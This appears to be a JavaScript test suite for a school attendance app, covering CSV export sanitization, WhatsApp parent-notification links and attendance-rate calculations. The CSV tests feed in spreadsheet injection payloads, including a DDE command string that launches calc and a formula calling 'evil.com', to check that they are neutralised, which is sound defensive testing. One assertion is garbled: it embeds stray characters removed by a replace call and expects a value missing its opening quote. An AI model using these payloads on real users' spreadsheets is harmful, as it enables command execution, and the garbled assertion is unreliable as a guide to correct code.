// ==========================================================================
// TEST SUITE: PHASE 4 — ATTENDANCE REPORT & EXPORT
// Plain node execution, zero network required.
// ==========================================================================

import assert from "assert";
import {
  sanitizeCsvValue,
  toCSV,
  sanitizeWhatsAppPhone,
  generateWhatsAppAttendanceLink,
  buildAttendanceReportRows
} from "../js/services/report-service.js";
import { getAcademicYearRange } from "../js/utils/date-time.js";
import { getAttendanceReport } from "../js/services/attendance-service.js";
import {
  setSupabaseClient,
  createSupabaseStub,
  TABLES
} from "../js/config/supabase-config.js";

let testsRun = 0;
let testsPassed = 0;

function test(name, fn) {
  testsRun++;
  try {
    fn();
    testsPassed++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    console.error(`  ✗ ${name}`);
    console.error(err);
    process.exitCode = 1;
  }
}

async function testAsync(name, fn) {
  testsRun++;
  try {
    await fn();
    testsPassed++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    console.error(`  ✗ ${name}`);
    console.error(err);
    process.exitCode = 1;
  }
}

console.log("\n========================================================");
console.log("  PHASE 4: ATTENDANCE REPORT, EXPORT & FORMULA INJECTION");
console.log("========================================================\n");

// --------------------------------------------------------------------------
// 1. CSV Formula Injection Sanitization
// --------------------------------------------------------------------------
console.log("--- 1. CSV Formula Injection Sanitization ---");

test("Formula injection with '=' is prefixed with single quote", () => {
  const sanitized = sanitizeCsvValue("=SUM(A1:B10)");
  assert.strictEqual(sanitized, "\"'=SUM(A1:B10)\"");
});

test("Formula injection with '+' is prefixed with single quote", () => {
  const sanitized = sanitizeCsvValue("+CMD|' /C calc'!A0");
  assert.strictEqual(sanitized, "\生活'+CMD|' /C calc'!A0\"".replace("生活", ""));
});

test("Formula injection with '-' is prefixed with single quote", () => {
  const sanitized = sanitizeCsvValue("-1+2");
  assert.strictEqual(sanitized, "\"'-1+2\"");
});

test("Formula injection with '@' is prefixed with single quote", () => {
  const sanitized = sanitizeCsvValue("@IMPORT('http://evil.com')");
  assert.strictEqual(sanitized, "\"'@IMPORT('http://evil.com')\"");
});

test("Normal text is not prefixed with single quote", () => {
  const sanitized = sanitizeCsvValue("Nabeel Mohammed");
  assert.strictEqual(sanitized, "\"Nabeel Mohammed\"");
});

test("Text with internal quotes is escaped with double quotes", () => {
  const sanitized = sanitizeCsvValue('John "Jack" Doe');
  assert.strictEqual(sanitized, '"John ""Jack"" Doe"');
});

test("Null and undefined produce empty quoted string", () => {
  assert.strictEqual(sanitizeCsvValue(null), '""');
  assert.strictEqual(sanitizeCsvValue(undefined), '""');
});

test("toCSV escapes headers and sanitizes formula injection across all rows", () => {
  const rows = [
    { name: "=1+1", class: "10", rate: "@formula" },
    { name: "Safe Name", class: "+91", rate: "95.5%" }
  ];
  const columns = [
    { key: "name", label: "Student Name" },
    { key: "class", label: "Class" },
    { key: "rate", label: "Rate" }
  ];
  const csv = toCSV(rows, columns);

  const lines = csv.split("\n");
  assert.strictEqual(lines[0], '"Student Name","Class","Rate"');
  assert.strictEqual(lines[1], "\"'=1+1\",\"10\",\"'@formula\"");
  assert.strictEqual(lines[2], '"Safe Name","\'+91","95.5%"');
});

// --------------------------------------------------------------------------
// 2. WhatsApp Phone Sanitization & Link Generation
// --------------------------------------------------------------------------
console.log("\n--- 2. WhatsApp Phone Sanitization & Link Generation ---");

test("sanitizeWhatsAppPhone formats 10-digit Indian numbers with 91", () => {
  assert.strictEqual(sanitizeWhatsAppPhone("9876543210"), "919876543210");
  assert.strictEqual(sanitizeWhatsAppPhone("98765-43210"), "919876543210");
  assert.strictEqual(sanitizeWhatsAppPhone(" 98765 43210 "), "919876543210");
});

test("sanitizeWhatsAppPhone preserves 12-digit number already prefixed with 91", () => {
  assert.strictEqual(sanitizeWhatsAppPhone("+91-98765-43210"), "919876543210");
  assert.strictEqual(sanitizeWhatsAppPhone("919876543210"), "919876543210");
});

test("sanitizeWhatsAppPhone returns empty string on empty or invalid input", () => {
  assert.strictEqual(sanitizeWhatsAppPhone(""), "");
  assert.strictEqual(sanitizeWhatsAppPhone(null), "");
  assert.strictEqual(sanitizeWhatsAppPhone(undefined), "");
});

test("generateWhatsAppAttendanceLink creates valid wa.me URL with encoded message", () => {
  const row = {
    name: "Aisha",
    class: "10",
    phone: "9876543210",
    parentName: "Fatima",
    attendancePercentage: 65.5,
    attended: 13,
    totalSessions: 20,
    absent: 7
  };

  const link = generateWhatsAppAttendanceLink(row);
  assert.ok(link.startsWith("https://wa.me/919876543210?text="));
  assert.ok(link.includes(encodeURIComponent("Dear Fatima,")));
  assert.ok(link.includes(encodeURIComponent("Aisha")));
  assert.ok(link.includes(encodeURIComponent("65.5%")));
  assert.ok(link.includes(encodeURIComponent("13/20")));
  assert.ok(link.includes(encodeURIComponent("7 absent")));
});

test("generateWhatsAppAttendanceLink falls back to 'Dear Parent,' if parentName missing", () => {
  const row = {
    name: "Bilal",
    class: "9",
    phone: "9123456789",
    parentName: "",
    attendancePercentage: 50.0,
    attended: 5,
    totalSessions: 10,
    absent: 5
  };

  const link = generateWhatsAppAttendanceLink(row);
  assert.ok(link.includes(encodeURIComponent("Dear Parent,")));
});

test("generateWhatsAppAttendanceLink returns null if student phone is missing", () => {
  const row = {
    name: "Bilal",
    class: "9",
    phone: "",
    parentName: "",
    attendancePercentage: 50.0
  };
  assert.strictEqual(generateWhatsAppAttendanceLink(row), null);
  assert.strictEqual(generateWhatsAppAttendanceLink(null), null);
});

// --------------------------------------------------------------------------
// 3. Academic Year Range Helper
// --------------------------------------------------------------------------
console.log("\n--- 3. Academic Year Range Helper ---");

test("getAcademicYearRange returns June 1 to March 31 for current academic year", () => {
  const range1 = getAcademicYearRange("2026-08-15");
  assert.strictEqual(range1.startIso, "2026-06-01");
  assert.strictEqual(range1.endIso, "2027-03-31");

  const range2 = getAcademicYearRange("2027-02-10");
  assert.strictEqual(range2.startIso, "2026-06-01");
  assert.strictEqual(range2.endIso, "2027-03-31");
});

// --------------------------------------------------------------------------
// 4. Attendance Report Row Builder
// --------------------------------------------------------------------------
console.log("\n--- 4. Attendance Report Row Calculation ---");

test("buildAttendanceReportRows correctly handles total sessions map and unmarked sessions", () => {
  const students = [
    { id: "s1", admissionNumber: "ADM001", name: "Zaid", class: "10", branch: "MAN", phone: "9876543210", parentName: "Ali" },
    { id: "s2", admissionNumber: "ADM002", name: "Sara", class: "9", branch: "MAN", phone: "9876543211", parentName: "Hassan" }
  ];

  const attendanceByStudentId = {
    s1: [
      { status: "Present" },
      { status: "Present" },
      { status: "Late" },
      { status: "Absent" }
    ],
    s2: [
      { status: "Present" }
    ]
  };

  const totalSessionsMap = {
    "10": 5, // s1 has 4 marked, 1 unmarked
    "9": 4   // s2 has 1 marked, 3 unmarked
  };

  const rows = buildAttendanceReportRows(students, attendanceByStudentId, totalSessionsMap);

  assert.strictEqual(rows.length, 2);

  // s1: total 5, present 2, late 1, absent 1 => attended 3 => unmarked 1, rate = 3/5 = 60.0%
  const r1 = rows[0];
  assert.strictEqual(r1.name, "Zaid");
  assert.strictEqual(r1.totalSessions, 5);
  assert.strictEqual(r1.present, 2);
  assert.strictEqual(r1.late, 1);
  assert.strictEqual(r1.absent, 1);
  assert.strictEqual(r1.unmarked, 1);
  assert.strictEqual(r1.attended, 3);
  assert.strictEqual(r1.attendancePercentage, 60.0);
  assert.strictEqual(r1.phone, "9876543210");
  assert.strictEqual(r1.parentName, "Ali");

  // s2: total 4, present 1, late 0, absent 0 => attended 1 => unmarked 3, rate = 1/4 = 25.0%
  const r2 = rows[1];
  assert.strictEqual(r2.name, "Sara");
  assert.strictEqual(r2.totalSessions, 4);
  assert.strictEqual(r2.present, 1);
  assert.strictEqual(r2.late, 0);
  assert.strictEqual(r2.absent, 0);
  assert.strictEqual(r2.unmarked, 3);
  assert.strictEqual(r2.attended, 1);
  assert.strictEqual(r2.attendancePercentage, 25.0);
});

test("buildAttendanceReportRows handles zero total sessions without division by zero", () => {
  const students = [
    { id: "s1", admissionNumber: "ADM001", name: "Zaid", class: "10", branch: "MAN" }
  ];
  const rows = buildAttendanceReportRows(students, {}, 0);
  assert.strictEqual(rows[0].totalSessions, 0);
  assert.strictEqual(rows[0].attendancePercentage, 0);
  assert.strictEqual(rows[0].unmarked, 0);
});

// --------------------------------------------------------------------------
// 5. getAttendanceReport Service Function
// --------------------------------------------------------------------------
console.log("\n--- 5. getAttendanceReport End-to-End ---");

await testAsync("getAttendanceReport aggregates sessions, students and attendance records", async () => {
  const stub = createSupabaseStub();
  setSupabaseClient(stub);

  // Seed students
  stub.seed(TABLES.STUDENTS, [
    {
      id: "std-1",
      admission_number: "SA-01",
      name: "Ahmed Khan",
      class: "10",
      branch: "MAN",
      phone: "9876500001",
      parent_name: "Tariq Khan"
    },
    {
      id: "std-2",
      admission_number: "SA-02",
      name: "Mariam Noor",
      class: "10",
      branch: "MAN",
      phone: "9876500002",
      parent_name: "Noor Ahmed"
    }
  ]);

  // Seed attendance sessions
  stub.seed(TABLES.ATTENDANCE_SESSIONS, [
    {
      id: "sess-1",
      branch: "MAN",
      class: "10",
      date: "2026-09-01",
      start_time: "09:00",
      end_time: "10:30",
      title: "Math Session"
    },
    {
      id: "sess-2",
      branch: "MAN",
      class: "10",
      date: "2026-09-02",
      start_time: "09:00",
      end_time: "10:30",
      title: "Science Session"
    }
  ]);

  // Seed records:
  // Ahmed attended sess-1 (Present), sess-2 (Late) => 2/2 = 100%
  // Mariam attended sess-1 (Absent), sess-2 (unmarked) => 0/2 = 0%, 1 unmarked
  stub.seed(TABLES.ATTENDANCE_RECORDS, [
    {
      id: "rec-1",
      session_id: "sess-1",
      student_id: "std-1",
      status: "Present",
      remarks: ""
    },
    {
      id: "rec-2",
      session_id: "sess-2",
      student_id: "std-1",
      status: "Late",
      remarks: "10m late"
    },
    {
      id: "rec-3",
      session_id: "sess-1",
      student_id: "std-2",
      status: "Absent",
      remarks: "Medical"
    }
  ]);

  const report = await getAttendanceReport({
    branch: "MAN",
    class: "10",
    startDate: "2026-09-01",
    endDate: "2026-09-30"
  });

  assert.strictEqual(report.totalSessions, 2);
  assert.strictEqual(report.totalStudents, 2);
  assert.strictEqual(report.rows.length, 2);

  const ahmed = report.rows.find((r) => r.studentId === "std-1");
  assert.ok(ahmed);
  assert.strictEqual(ahmed.totalSessions, 2);
  assert.strictEqual(ahmed.present, 1);
  assert.strictEqual(ahmed.late, 1);
  assert.strictEqual(ahmed.absent, 0);
  assert.strictEqual(ahmed.unmarked, 0);
  assert.strictEqual(ahmed.attended, 2);
  assert.strictEqual(ahmed.attendancePercentage, 100);

  const mariam = report.rows.find((r) => r.studentId === "std-2");
  assert.ok(mariam);
  assert.strictEqual(mariam.totalSessions, 2);
  assert.strictEqual(mariam.present, 0);
  assert.strictEqual(mariam.late, 0);
  assert.strictEqual(mariam.absent, 1);
  assert.strictEqual(mariam.unmarked, 1);
  assert.strictEqual(mariam.attended, 0);
  assert.strictEqual(mariam.attendancePercentage, 0);

  // Mariam's low attendance generates a valid WhatsApp link
  const wa = generateWhatsAppAttendanceLink(mariam);
  assert.ok(wa);
  assert.ok(wa.includes("919876500002"));
  assert.ok(wa.includes(encodeURIComponent("Dear Noor Ahmed,")));
});

console.log("\n========================================================");
console.log(`  PHASE 4 TEST SUMMARY: ${testsPassed}/${testsRun} tests passed`);
console.log("========================================================\n");
